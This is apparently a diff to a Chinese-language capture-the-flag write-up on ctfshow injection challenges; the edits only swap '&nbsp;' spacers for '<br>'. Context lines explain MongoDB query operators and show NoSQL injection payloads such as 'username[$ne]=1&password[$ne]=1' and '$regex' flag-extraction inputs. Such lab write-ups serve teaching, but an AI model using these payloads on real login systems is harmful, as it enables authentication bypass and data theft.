-&nbsp;
+<br>
 
 
 
@@ -8258,7 +8258,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904155146495.png" alt="image-20250904155146495" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8527,7 +8527,7 @@ rnn = requests.get(nn_url)
 print(rnn.text)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8550,7 +8550,7 @@ sql语句
 
  从 **Memcache 缓存服务器** 中，取出键名为 `$id` 的缓存数据，并赋值给 `$user`。
 
-&nbsp;
+<br>
 
 
 
@@ -8560,7 +8560,7 @@ sql语句
 
 **可以给 `Memcache::get()` 方法传递一个数组（多个key）来获取一个数组的元素值，返回的数组仅仅包含从服务端查找到的 key-value 对**
 
-&nbsp;
+<br>
 
 
 
@@ -8572,7 +8572,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904162617834.png" alt="image-20250904162617834" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8597,7 +8597,7 @@ sql语句
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8609,7 +8609,7 @@ sql语句
 
 **`$query = new MongoDB\Driver\Query($data);` 的意思是把查询条件封装成一个 MongoDB 查询对象，方便后面执行。**
 
-&nbsp;
+<br>
 
 
 
@@ -8623,7 +8623,7 @@ sql语句
 
 **`->toArray()` 把游标里的所有结果转换成一个 PHP 数组，方便访问。**
 
-&nbsp;
+<br>
 
 
 
@@ -8642,7 +8642,7 @@ sql语句
 > | `$nin` | 不在指定数组内     | `{ age: { $nin: [18,19,20] } }` → 年龄不是 18、19、20 中的任何一个 |
 > | `$all` | 包含数组中所有元素 | `{ tags: { $all: ["red","big"] } }` → tags 必须同时有 "red" 和 "big" |
 >
-> &nbsp;
+> <br>
 >
 > 
 >
@@ -8653,7 +8653,7 @@ sql语句
 > | `$or`  | 或条件      | `{ $or: [ {age:18}, {age:20} ] }` → 年龄是 18 或 20 |
 > | `$not` | 取反/反匹配 | `{ age: { $not: { $gt: 18 } } }` → 年龄 ≤ 18        |
 >
-> &nbsp;
+> <br>
 >
 > 
 >
@@ -8668,7 +8668,7 @@ sql语句
 > - 意思是：查询名字里 **包含字母 s** 的用户。
 > - `.*` 表示任意字符任意长度。
 >
-> &nbsp;
+> <br>
 >
 > 
 >
@@ -8680,7 +8680,7 @@ sql语句
 > { "age": { "$lt": 23 } }             // age < 23
 > ```
 
-&nbsp;
+<br>
 
 
 
@@ -8688,7 +8688,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904170052785.png" alt="image-20250904170052785" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8700,7 +8700,7 @@ sql语句
 username[$ne]=1&password[$ne]=1
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8725,7 +8725,7 @@ sql语句
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8742,7 +8742,7 @@ username[$ne]=admin&password[$ne]=1
 
 <img src="\images\article_images\image-20250904171914214.png" alt="image-20250904171914214" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8769,7 +8769,7 @@ sql语句
 
 **`db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()` ：在 `ctfshow_user` 表里查找 用户名和密码同时匹配的用户，并把结果以漂亮格式打印出来**
 
-&nbsp;
+<br>
 
 
 
@@ -8783,7 +8783,7 @@ username[$ne]=1&password[$regex]=ctfshow{
 
 <img src="\images\article_images\image-20250904171324967.png" alt="image-20250904171324967" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8808,7 +8808,7 @@ sql语句
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8822,7 +8822,7 @@ username[$regex]=flag&password[$ne]=1
 
 
 
-&nbsp;
+<br>
 
 
 
